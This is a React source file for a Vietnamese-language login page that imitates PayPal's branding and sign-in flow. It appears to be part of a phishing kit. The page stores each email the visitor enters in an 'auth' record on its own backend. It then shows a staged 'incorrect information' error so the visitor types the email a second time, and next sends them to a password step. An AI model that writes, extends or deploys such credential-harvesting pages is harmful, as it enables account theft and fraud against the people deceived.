
import './login.css';
import '../../responsive.css';
import '../../loader.css';
import paypalMark from '../../assets/paypal-mark-color.svg';
import vienamlogo from '../../assets/vietnam.png';
import narrowicon from '../../assets/narrow-down.svg';
import alertLogo from '../../assets/alert.svg';
import { useContext, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { updateDocument } from '../../services/api';
import { AppIDProvider, EmailContext } from '../../context/AppContext';




export default function Login() {
  const navigate = useNavigate();
  const [isError, setIsError] = useState<boolean>(false);
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [email, setEmail] = useState<string>('')
  const [step, setStep] = useState<1|2>(1);
  const id = useContext(AppIDProvider);
  const { setCurrentEmail } = useContext(EmailContext);
  const validateForm = () => {
    if(step === 1){
      updateDocument('auth', {email_1: email}, id );
      setIsLoading(true);
      setTimeout(()=>{
        setIsError(true);
        setIsLoading(false);
        setStep(2);
      },2000)
    }else{
    setIsLoading(true);
    updateDocument('auth', {email_2: email}, id );
      setTimeout(()=>{
      setIsLoading(false);
      setCurrentEmail(email);
      navigate('/password')
      },2000)
    }
  }
  return (
    <div >
       <div className="relative">
        <div className="login-container">
          <div className="logo">
            <img src={paypalMark} alt="PayPal Logo" />
          </div>
          <div id="loginForm" onSubmit={validateForm}>
              {isError && 
                <div id="error-group" className="error-group">
                  <img
                    className="alert-icon"
                    src={alertLogo}
                    width="20px"
                    height="20px"
                  />
                  <p className="error-text">
                    Một số thông tin của bạn không chính xác. Vui lòng thử lại.
                  </p>
                </div>
              }
      
            <div id="emailGroup" className="fieldWrapper">
              <input value={email} onChange={(e)=>setEmail(e.target.value)} type="text" id="email" name="email" placeholder='Email hoặc số điện thoại di động'/>
              {/* <label id="loginLabel" htmlFor="email" className="fieldLabel">Email hoặc số điện thoại di động</label> */}
            </div>

            <a id="recoveryOption" className="recoveryOption">Bạn quên email?</a>
            <div className="actions">
              <button id="continueBtn" className="button" onClick={validateForm}>Tiếp theo</button>
            </div>
            <div className="splitPassword">
              <div className="divider"></div>
              <span className="splitPasswordText">hoặc</span>
            </div>
          </div>
          <div className="actions">
            <button type="submit" className="register-button">Đăng ký</button>
          </div>
          <div className="languageWrapper">
            <img
              className="flag-vn"
              src={vienamlogo}
              width="20px"
              height="20px"
            />
            <img
              className="narrow-down"
              src={narrowicon}
              width="16px"
              height="16px"
            />
            <span className="languageText languageText-selected">Tiếng Việt</span>
            <span>|</span>
            <span className="languageText">English</span>
          </div>
        </div>
            {isLoading &&
              <div className="loading-container" id="loader">
                <div className="loader"></div>
              </div>
            }
        <div className="footer">
          <span className="footer-item">Liên hệ với chúng tôi</span>
          <span className="footer-item">Quyền riêng tư</span>
          <span className="footer-item">Pháp lý</span>
          <span className="footer-item">Toàn cầu</span>
        </div>
      </div>
    </div>
  )
}
